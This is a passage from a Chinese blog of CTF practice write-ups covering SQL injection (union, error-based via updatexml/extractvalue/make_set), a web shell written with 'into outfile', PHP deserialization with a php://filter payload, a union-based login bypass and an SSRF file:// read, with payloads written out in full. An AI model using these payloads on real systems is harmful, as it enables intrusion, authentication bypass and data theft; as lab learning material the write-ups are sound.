</p><p>接着我们构造sql语句写入一句话代码。  </p><blockquote><p>?id=999’)) union select 1,’<?php @eval($_POST['cmd']);?>‘,3 into outfile ‘D:\phpstudy_pro\WWW\qli-labs-master\124.php’–+</p></blockquote><p>可以看到，我们在第二位上写了一句话代码，并用into outfile命令写入了网站的数据库，并且这个php文件叫做124.php。  </p><p>这里用的 \ \ 而不是平常的 \ 是因为用一个斜杠会在上传时被过滤掉，所以用第二个斜杠对第一个斜杠进行转义，确保上传路径没有问题。  </p><p>注意一点：要想向数据库写入文件，使用into outfile命令是需要数据库file权限的，数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限。这个权限需要修MySQL的改配置文件才行。  </p><p>很难受的是我做这道题的时候无论怎么修改配置文件也没办法写入成功，弄了半天也不知道问题出现在哪里，所以没有办法进行下一步，使用剑蚁链接了。   </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题其实相当于一个上传文件题目，让我知道了sql注入里也可以通过写入一句话木马等文件来得到数据库信息，原理不难理解，只是对于写入的权限和路径的准确要清楚。</p>]]></content>
      
      
      <categories>
          
          <category> test34 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习25</title>
      <link href="test33/undefined-undefined.html"/>
      <url>test33/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>过完年的我又来更新了！每天一题，争取稳步提升。<br>今天这道题其实有很多细节，但是我没有注意到，第一次误打误撞做出来了。回来看了别人的wp才发现不少知识点。。。。  </p><h1 id="网鼎杯-2020-青龙组-AreUSerialz-1"><a href="#网鼎杯-2020-青龙组-AreUSerialz-1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz 1"></a>[网鼎杯 2020 青龙组]AreUSerialz 1</h1><p>打开题目，一堆代码。。。。。。。<br><img src="https://i.loli.net/2021/02/15/Q8rTyRPAW45KGiD.png" alt="1.png">  </p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight _ file(__ FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;  </code></pre><p>代码很长，所以要找重点，开头定义三个变量，op,filename,content。接着分别给这三个变量赋予了值，然后就是process()函数，这个函数检查op变量的值，如果op=1，那么转到write()函数，如果op=2，那么转到read()函数。<br>我们已经可以知道，flag在flag.php里，所以我们要用的是read()函数来读出来flag.php里的信息。<br>read函数很简单，直接一个file _get _contents()函数读出变量filename里的文件信息。然后赋予res变量，最后返回res变量。<br>到这里我们大概就明白这道题的思路了，让op=2，filename=我们要查看的文件名，对这些变量进行序列化。然后赋予一个变量进行传参。  </p><p>那么接着往后看吧，有一个__destruct()魔术函数，这个函数一开始我是没有在意的，直接看的里面的内容，其实理解的结果差不多。  </p><p>这个魔术函数会在对象被销毁时（即从内存中清除前）调用。也就是说，当我们给op这个对象进行赋值时，是销毁了之前的值的，这时这个函数就会被调用，执行什么呢？他会判断我们的op的值是不是等于字符串”2”,<strong>注意这里判断的是op是否等于字符串”2”，而非整形数字2,因为这里是===，属于强比较，会比较值和字符类型。前面的process()函数中是==，只判断op的值是不是2，不判断类型。</strong>  </p><p>所以如果它判断op为字符串”2”，那么就会把它的值变回原来的一样。如果不是，那么就会把对象content里的值清空，执行process()函数。  </p><p>再往后就是is_valid函数。这个其实是一个坑，因为一开始我没注意到这三个对象的类型是protected，而是按照pubulic类型来序列化的，所以误打误撞的绕过了这个函数，下面具体解释一下这个函数作用。  </p><p>这个函数，首先将我们传入的字符串一个一个的取出来然后用ord()函数来返回每一个字符的ASCII码，进行检查要求它们在32–125之间，也就是可以要求上传的都是可以打印的字符。否则就返回false。  </p><p>但是前面我们已经知道这三个对象的类型是protected，在正常的序列化情况下是这样的：  </p><blockquote><p>protected类型:属性名变为”%00*%00属性名”</p></blockquote><p>而%00这个是无法打印的字符，所以是通不过的，同理Private类型也是如此，但是在php7.1以上的版本对对象类型并不敏感，所以我们构造public对象也是可以的，而且还成功绕过了这一函数，所以我是误打误撞了哈哈哈哈。  </p><p>最后就是我们上传的方法，get上传，字符串名字为str，于是我先构造这样的payload。  </p><blockquote><p>?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:12:”Hello World!”;}</p></blockquote><p>但是回显确实空，这说明我们的read函数并没有成功执行。<br><img src="https://i.loli.net/2021/02/15/32GhFZaSMwDVXlv.png" alt="2.png"><br>应该是不知道flag.php的绝对路径，所以无法直接读取，那么我们就用伪协议来读这个文件。  </p><blockquote><p>?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;s:12:”Hello World!”;}</p></blockquote><p>果然显示了base64编码过的内容，拿去解码就得到flag。<br><img src="https://i.loli.net/2021/02/15/oNgRY9O3HIduChG.png" alt="3.png">  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题并不是很难，看似代码很长但是不难理解，只不过有很多小细节在这里，这次是运气好做了出来，但是下次就不一定了。但是利用php版本的不同来绕过函数还是不好想到的。只能多试试不同的解法，要敢于试，说不定就有结果。<br>对代码审计的题目还是要沉下心，抓住重点，一步步来。</p>]]></content>
      
      
      <categories>
          
          <category> test33 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习24</title>
      <link href="test32/undefined-undefined.html"/>
      <url>test32/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>sql注入的许多不起眼的地方都有可能是一个绕过方法。  </p><h1 id="GXYCTF2019-BabySQli-1"><a href="#GXYCTF2019-BabySQli-1" class="headerlink" title="[GXYCTF2019]BabySQli 1"></a>[GXYCTF2019]BabySQli 1</h1><p>打开这道题，发现是个登陆界面。<br><img src="https://i.loli.net/2021/02/11/VLlEiAzqRgaoy8T.png" alt="1.png"><br>接着就尝试万能密码，发现不行。再尝试常规注入，发现不行。最后尝试报错注入和盲注，发现依旧不行。<br>随后又查了一下过滤了啥。进行fuzz测试后发现过滤了( 、)、=、or等字符。随后又进行绕过，但是始终绕不过去。到这里就没有什么头绪了，只能看一眼别人的wp了。  </p><p>看了别人的wp后发现源码里面有提示。。。。。。<br><img src="https://i.loli.net/2021/02/11/dlwqIB2UcJ4uCrv.png" alt="2.png"><br>当进入报错回显页面是有一串奇怪的字符串，只有大写字母和数字构成，可以猜到这是一串base32编码。拿去解密一下。<br><img src="https://i.loli.net/2021/02/11/jmQTEIcGgpZWADM.png" alt="3.png"><br>解完后的编码后面有两个等号，很明显是base64编码。再次解码。<br><img src="https://i.loli.net/2021/02/11/b98rqJPVXKFew4O.png" alt="4.png"><br>解完后是这样一句sql语句：  </p><blockquote><p>select * from user where username = ‘$name’</p></blockquote><p>可以看出来我们要输入已经在数据库里存在的用户名才不会被过滤。<br>再回看被过滤的字符串中or可以使用大小写过滤，那么我们可以查出来这个数据库有几列。  </p><blockquote><p>输入username=1’ Order by 3#</p></blockquote><p><img src="https://i.loli.net/2021/02/11/l5ExYurgePhiCmG.png" alt="5.png"><br>发现用户名错了，看来必须输入正确的用户名，猜一手admin，（后来发现这个用户名可以用sqlmap跑出来）  </p><blockquote><p>username=admin’ Order by 3#</p></blockquote><p><img src="https://i.loli.net/2021/02/11/UdebF5kABupwGt1.png" alt="6.png"><br>用户名对了，密码不对，接着试有几列。  </p><blockquote><p>username=admin’ Order by 4#</p></blockquote><p><img src="https://i.loli.net/2021/02/11/MuZLkVGHlJgEhN5.png" alt="7.png"><br>数据有三列。应该是id，username，password。（这三个列名可以sqlmap跑出来）并且可以得密码是经过md5加密过的。<br>但是接下来该怎么办呢？这里就要回顾一下刚开始学sql注入时的一个小细节了。<br>刚开始学sql注入时，当我们使用联合查询查库名等信息时，我们可以注意到如果我们使用数据库中已有的id那么我们是查不出来东西的，比如以下语句。  </p><blockquote><p>?id=1’ union select 1,2,database()–+</p></blockquote><p>这样是查不出来的，要想查出数据库名字，就要取一个不存在的id，比如id=999，这样就能爆出数据库。  </p><blockquote><p>?id=999’ union select 1,2,database()–+  </p></blockquote><p>为什么会这样呢？这就涉及到sql查询中的一个现象，当在<strong>联合查询过程中如果数据库中没有对应的结果时,数据库会临时创建一个虚拟数据。</strong>比如当我输入id=999’ union select 1,2,database()–+是，就相当于创建了一个id为999的用户的数据，那么后面联合查询到的信息就能回显到界面了。  </p><p>因为我们已经知道了这个登录的数据库中一定有一个admin用户，但是不知道密码。那么我们能不能利用上面的思路，来绕过原本密码的验证呢？  </p><p>答案是可以的。  </p><blockquote><p>构造name=1’ union select 0,’admin’,’81dc9bdb52d04dc20036dbd8313ed055’#&amp;pw=1234</p></blockquote><p>可以看到，我们的联合查询要查询的id为0，但是数据库里没有这个id，所以他就构造了一个id为0的数据，而这行数据的的用户名是admin，密码是md5加密过的1234，而我们在界面输入的密码也是1234。当系统执行时，它会认证用户名和密码的正确性，这是就会把我们的虚拟数据拿出来比对，结果显而易见。我们可以成功登入。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题考察了sql注入的联合查询的一个特性，利用这个特性可以绕开密码和用户的认证。这也提醒我要注意以前做过的题目中的细节，说不定它就是下一道题的关键。</p>]]></content>
      
      
      <categories>
          
          <category> test32 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于报错注入concat函数的替换</title>
      <link href="note5/undefined-undefined.html"/>
      <url>note5/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>好久没做过笔记了，昨天做的一道题目中sql报错注入时concat函数被过滤导致基于updatexml（）函数的报错注入没法进行（关于这个函数的报错注入详见之前的博客）。<br>因为updatexml（）函数函数的报错是基于查找的字符的位置的格式不对而报错的，所以要用到concat函数将错误格式的字符和要查的字符串连接起来。如下  </p><blockquote><p>select username from security.user where id=1 and (updatexml(‘anything’,<strong>concat</strong>(‘~’,(select database())),’anything’))</p></blockquote><p>但是这道题将concat函数过滤了，那么还有没有别的函数可以代替了呢？<br>看了别人的wp后发现了可以用make_set()函数来代替。  </p><hr><h2 id="MAKE-SET-bits-str1-str2-…"><a href="#MAKE-SET-bits-str1-str2-…" class="headerlink" title="MAKE_SET(bits,str1,str2,…)"></a>MAKE_SET(bits,str1,str2,…)</h2><p>返回一个设定值(含子字符串分隔字符串”,”字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果。<br>如make_ set(1,’a’,’b’,’c’)<br>返回的结果就是a，因为bits会转为二进制，1的二进制为0001，倒过来排序为1000，对应str1，也就取a。<br>接下来才是重点。<br>当make_set(3,’a’,’b’,’c’)时返回的是a，b。<br>并到过来排序，3的二进制是0011，倒过来是1100，所以对应str1，str2，那么就返回a，b。  </p><hr><p>那么我们不就可以用它来替代concat函数了吗。<br>这样构造：<br>爆列名</p><blockquote><p>view.php?no=1 and updatexml(1,make _set(3,’~’,(select group _concat(column _name) from information _schema.columns where table _name=”users”)),1)#</p></blockquote><p>这样make_set()函数实际返回的值就是“’<del>‘,列名”,这样格式依旧是错误的，可以成功报错。<br>后面爆data信息的时候因为字符串较长，可以用substring()来一段一段的截取。<br>附上截图<br><img src="https://i.loli.net/2021/02/09/8AcY1Bgotb7KkRh.png" alt="5.png"><br><img src="https://i.loli.net/2021/02/09/a6zTKAwDfbyVUE8.png" alt="6.png"><br>关于make _set()函数的讲解。<br>[MySQL make_set()的用法](<a href="https://blog.csdn.net/qq_41725312/article/details/83039525?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161278616016780264099884%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&amp;request_id=161278616016780264099884&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/qq_41725312/article/details/83039525?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161278616016780264099884%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&amp;request_id=161278616016780264099884&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a></del>all<del>first_rank_v2</del>rank_v29-1-83039525.pc_search_result_cache&amp;utm_term=make_set)</p>]]></content>
      
      
      <categories>
          
          <category> note5 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习23和ssrf攻击</title>
      <link href="test31/undefined-undefined.html"/>
      <url>test31/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天这道题目依旧是知识点多多。  </p><h1 id="网鼎杯-2018-Fakebook-1"><a href="#网鼎杯-2018-Fakebook-1" class="headerlink" title="[网鼎杯 2018]Fakebook 1"></a>[网鼎杯 2018]Fakebook 1</h1><p>打开题目，发现是一个博客界面，有注册和登录两个选项，先尝试了一波sql注入，发现不行，于是只能先注册一个博客了。<br><img src="https://i.loli.net/2021/02/09/qu9F4gaLeNMIyJv.png" alt="8.png"><br>注册后界面上就显示了我们的博客，发现可以点进去，那就进去看一下试试。<br><img src="https://i.loli.net/2021/02/09/3KuRVLTaFjNBJiq.png" alt="9.png"><br>进去后可以看到url处有view.php?no=1这样的字符，怀疑这里有sql注入。尝试一下。<br><img src="https://i.loli.net/2021/02/09/4v1MZVrk9ycEfIp.png" alt="10.png"><br>判断注入类型，输入no=1 and 1=1正常回显，输入no=1 and 1=2时报错，判断是数值型注入。<br><img src="https://i.loli.net/2021/02/09/QmvRsfO8hugiB5F.png" alt="11.png"><br>接着就是查有几列和哪一个是回显位了。<br>输入no=1 order by 5后发现报错，说明只有四列。<br><img src="https://i.loli.net/2021/02/09/czNt4yqpsge3ZXP.png" alt="12.png"><br>接着输入no=1 union select 1,2,3,4#发现有的字符被过滤了<br><img src="https://i.loli.net/2021/02/09/tZT9zGNid5qO3p8.png" alt="13.png"><br>这里因为不知道什么被过滤了，于是先用了另一种sql注入方法，用双查询注入来通过报错来查看，但是这种方法在查表名时却因为字符串过长而无法查看，用limit 0,1也没有用，于是又换了另外两种报错注入来查，发现concat被过滤了，啊这。。。。。。<br>最后兜兜转转回到原点，只能猜测一手过滤了空格，于是构造这样的payload。<br>no=0/ * * /union/ * * /select/**/1,2,3,4–+<br>发现成功了。。。。界面上第二位有回显。<br><img src="https://i.loli.net/2021/02/09/Yf9ojBlFDACeSz1.png" alt="14.png"><br>看了一下别人的wp，发现只需要在union和select之间加上注释符就可以了，不知道这是过滤了啥。。。。<br>不管怎么说，接下来就是正常的爆库名和表名，列名，和值了。<br>爆库名 </p><blockquote><p>view.php?no=0 union/**/select 1,database(),3,4–+</p></blockquote><p><img src="https://i.loli.net/2021/02/09/Qm2Td3J8c5nrkIS.png" alt="15.png"><br>库名为fakebook。  </p><p>爆表名。  </p><blockquote><p>view.php?no=0 union/**/select 1,group _concat(table _name),3,4 from information _schema.tables where table _schema=’fakebook’–+  </p></blockquote><p><img src="https://i.loli.net/2021/02/09/DaLPiEcMGAfC8Uz.png" alt="16.png"><br>表名为user。  </p><p>爆列名。  </p><blockquote><p>view.php?no=0 union/**/select 1,(select group _concat(column _name) from information _schema.columns where table _name=’users’),3,4–+</p></blockquote><p><img src="https://i.loli.net/2021/02/09/aZ7LItKsCfDwhv4.png" alt="68.png"><br>列名为no,username,passwd,data。  </p><p>爆信息。  </p><blockquote><p>view.php?no=0%20union/**/select%201,group _concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users –+</p></blockquote><p><img src="https://i.loli.net/2021/02/09/KrGIdMHS5N4ovxp.png" alt="1.png"><br>可以看到列名对应的信息。<br>no: 1<br>username: qz<br>passwd:3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2<br>data: O:8:”UserInfo”:3:{s:4:”name”;s:2:”qz”;s:3:”age”;i:18;s:4:”blog”;s:28:”<a href="https://george186.github.io/&quot;;%7D">https://george186.github.io/&quot;;}</a><br>这里让人注意的就是这个序列化后的data。这个序列化很好理解，就是将用户的name，age，blog地址序列化而已，但是怎么利用这个序列化呢？<br>看了别人的wp后才发现有备份文件的。。。。<br>赶紧拿dirsearch扫一下，发现有robots.txt。打开后提示我们有一个user.php.bak备份文件。那就把它下载下来。（其实应该还有一个flag.php,但是我没有扫到。）<br><img src="https://i.loli.net/2021/02/09/Exs87I1Ylyd35JR.png" alt="2.png"><br>好家伙，找到data序列化的源码了，可是后面有一串代码还是第一次见，get($url)函数到底有啥用。只能看一下别人的说法了。  </p><p>看完后得知这里用到了ssrf攻击。这个ssrf攻击在刚开始学ctf的时候就知道了，可是当时了解不深，这次再详细学一下。  </p><hr><h2 id="ssrf攻击"><a href="#ssrf攻击" class="headerlink" title="ssrf攻击"></a>ssrf攻击</h2><p>SSRF(Server-Side Request Forgery，服务器端请求伪造)漏洞，是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。</p><p>SSRF漏洞原理: 很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）。一般情况下， SSRF攻击的目标是从外网无法访问的内部系统 。（ 正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统 ）.SSRF 形成的原因大都是由于 服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制 。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。<br>这张图很生动形象了。<br><img src="https://i.loli.net/2021/02/09/FU8N3fVj2nap9gL.png" alt="3.png"><br>简单来说，就是存在一个指定的url地址可以获取另一个主机里的文件，比如html，php，asp，jsp这些文件，它们都存于另一个主机，而要想获取他们，就必须从一个指定的url地址来发送请求获取。过程如下：  </p><p>用户在地址栏输入网址    ——&gt;     向目标网站发送请求 ——-&gt;   目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 ——-&gt;    用户接收页面并在浏览器中显示  </p><p>比如<a href="http://www.xxx.com/a.php?image=http://www.abc.com/1.jpg%E8%BF%99%E6%A0%B7%E4%B8%80%E4%B8%AA%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%B0%B1%E6%98%AF%E4%BB%8E%E6%8C%87%E5%AE%9A%E7%9A%84url%E5%9C%B0%E5%9D%80%E6%9D%A5%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E5%9B%BE%E7%89%87%E3%80%82">www.xxx.com/a.php?image=http://www.abc.com/1.jpg这样一个请求，就是从指定的url地址来发送请求，访问获取另一个网站的图片。</a> </p><p>但是，但是，但是，如果这个image=参数的过滤和限制并不严格的话，那么攻击者就有可能利用这一点来从网站获取更多数据。这也就是ssrf攻击。  </p><p>和ssrf漏洞相关的函数有以下几种：<br>file _get _contents()<br>fsockopen()<br>curl _exec()  </p><p>攻击者利用ssrf可以实现的攻击主要有5种:</p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。<br>而这道题用到的就是file协议。  </p><hr><p>了解了ssrf攻击后，再看回这个没见过代码。可以看到，这里面有很多curl函数，curl又是个什么呢？  </p><p>引用一下别人的解释：“curl是一个库，能让你通过URL和许多不同种的服务器进行勾搭、搭讪和深入交流，并且还支持许多协议。并且人家还说了curl可以支持https认证、http post、ftp上传、代理、cookies、简单口令认证等等功能”<br>curl 是一个利用URL语法在命令行方式下工作的文件传输工具。是一个命令行工具。就和cmd和linux里的命令一样。<br>具体的使用命令和参数百度就可以了，这里就是简单了解一下。  </p><p>接着我们一一来看这串代码。  </p><pre><code>    function get($url)    &#123;        $ch = curl_init();//初始化一个curl会话        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的URL        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上        $output = curl_exec($ch); //运行cURL，请求网页，将结果赋予变量$output        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;        curl_close($ch);//关闭curl会话        return $output;//返回输出$output    &#125;  </code></pre><p>简单来说，就是我们以get方式传参我们的url，再进过序列化后运行，可以看出来，这里就产生了ssrf漏洞。它并没有对我们上传的参数做出严格的过滤，所以我们最后上传后就成了<a href="http://www.xxx.com/a.php?no=file://......%E8%BF%99%E6%A0%B7%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%B9%B6%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%AA%E4%B8%8D%E8%BF%87%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E7%9A%84url%E8%A2%AB%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86%E8%80%8C%E5%B7%B2%E3%80%82%E7%BB%93%E5%90%88%E4%B9%8B%E5%89%8D%E6%88%91%E4%BB%AC%E6%9F%A5%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF%EF%BC%9A">www.xxx.com/a.php?no=file://......这样的格式并被执行，只不过我们上传的url被序列化了而已。结合之前我们查到的字段信息：</a>  </p><blockquote><p>O:8:”UserInfo”:3:{s:4:”name”;s:2:”qz”;s:3:”age”;i:18;s:4:”blog”;s:28:”<a href="https://george186.github.io/&quot;;%7D">https://george186.github.io/&quot;;}</a></p></blockquote><p>可以看出来正常情况下上传的url就是博客地址，而我们就可以对这个url进行伪造，从而进行攻击。<br>而这里我们选择的就是file://协议来读取文件。因为我们已经在报错的回显中得到了文件的路径：/var/www/html/  </p><p>所以我们最终这样构造：  </p><blockquote><p>O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}  </p></blockquote><p>通过前面的sql注入可以得知data在第四列，所以我们把重新构造的序列化信息放在第四列上传。  </p><blockquote><p>view.php?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  </p></blockquote><p><img src="https://i.loli.net/2021/02/09/B3pjUJNZQsyHaVh.png" alt="4.png"><br>可以看到页面显示的就是我们刚刚构造的信息，那么我们构造的新的url被执行了，也就是我们获取了flag.php文件，接着可以f12查看到flag。  </p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这道题不仅考了sql注入，还考了ssrf攻击，ssrf攻击是一个不算新的知识点了，但是之前只是简单了解了一下，这道题再次学习了一次，但是还是基础知识。之后还有再深入。<br>附上学习博客。<br><a href="https://blog.csdn.net/weixin_39934520/article/details/107961105?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161277009316780271561207%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161277009316780271561207&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-107961105.pc_search_result_cache&utm_term=get%2528%2529%25E5%2587%25BD%25E6%2595%25B0%25E5%25AD%2598%25E5%259C%25A8SSRF%2528%25E6%259C%258D%25E5%258A%25A1%25E7%25AB%25AF%25E8%25AF%25B7%25E6%25B1%2582%25E4%25BC%25AA%25E9%2580%25A0%2529%25E6%25BC%258F%25E6%25B4%259E%25E3%2580%2582">浅谈“服务端请求伪造攻击SSRF”</a><br><a href="https://blog.csdn.net/mz911118/article/details/82981884?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_utm_term-3&spm=1001.2101.3001.4242">CURL</a><br><a href="https://blog.csdn.net/weixin_38088097/article/details/107837104?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161285189216780262565065%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161285189216780262565065&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-11-107837104.pc_search_result_cache&utm_term=curl%25E4%25BB%2580%25E4%25B9%2588%25E6%2584%258F%25E6%2580%259D">curl常用参数介绍</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test31 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习22和报错注入</title>
      <link href="test30/undefined-undefined.html"/>
      <url>test30/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天将报错注入方法扩展两个。  </p><h1 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h1><p>打开题目，发现是登陆题目。<br><img src="https://i.loli.net/2021/02/08/bAlqkn3FMRt9sLJ.png" alt="1.png"><br>尝试万能密码，发现不行，又尝试正常注入方式，发现有字符被过滤了。<br><img src="https://i.loli.net/2021/02/08/32qV5tzKNOnWRgE.png" alt="2.png"><br>于是进行一下fuzz模糊测试，看看有啥字符被过滤了。<br>经过测试后，发现union，空格等字符被过滤了，并且双写绕过也无法进行，只能考虑报错注入和布尔盲注了，可是布尔盲注也不行，因为无法判断页面回显是对还是错。而且相关函数还被过滤了。<br>那么手里只剩下报错注入了，可是这前学到的双查询的报错注入在这里也行不通，应该是相关函数被过滤了，那么只能用剩下的报错注入方法了。  </p><hr><h2 id="基于extractvalue-和updatexml-的报错注入"><a href="#基于extractvalue-和updatexml-的报错注入" class="headerlink" title="基于extractvalue()和updatexml()的报错注入"></a>基于extractvalue()和updatexml()的报错注入</h2><p>这两个函数分别也能完成报错注入，我们知道，报错注入的原理就是函数报错导致将数据库的信息给爆出来，从而达到sql注入的目的。在双查询注入中是count()这个聚合函数的报错，而这两个函数的报错同样可以达到这一目的。下面一一介绍。   </p><h3 id="Extractvalue-函数"><a href="#Extractvalue-函数" class="headerlink" title="Extractvalue() 函数"></a>Extractvalue() 函数</h3><p>Extractvalue() 函数使用XPath表示法从XML字符串中提取值。更准确地说，它是会从目标xml文件中返回所包含查询值的字符串<br>extractvalue(‘XML_ document’,’Xpath_string’)<br>extractvalue(‘目标xml文件名’,’在xml中查询的字符串’)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询的话第二个参数的位置格式 为 /xxx/xx/xx/xx 。即使查询不到也不会报错，比如  </p><blockquote><p>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</p></blockquote><p>这个就是查询anything文件中的/x/xx字符串，显然查询不到，但是结果会返回空却不会报错。<br>接下来如果我们这样构造：  </p><blockquote><p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p></blockquote><p>可以看到第二个参数的格式错了，这就导致了函数报错，而它的报错会将我们查询的值给报错出来，这就达到了目的。  </p><h3 id="Updatexml-函数"><a href="#Updatexml-函数" class="headerlink" title="Updatexml() 函数"></a>Updatexml() 函数</h3><p>这个函数和extractvalue基本相同，这是一个修改xml文件的函数，语法为：<br>updatexml(‘XML_ document’,’Xpath _string’,’New 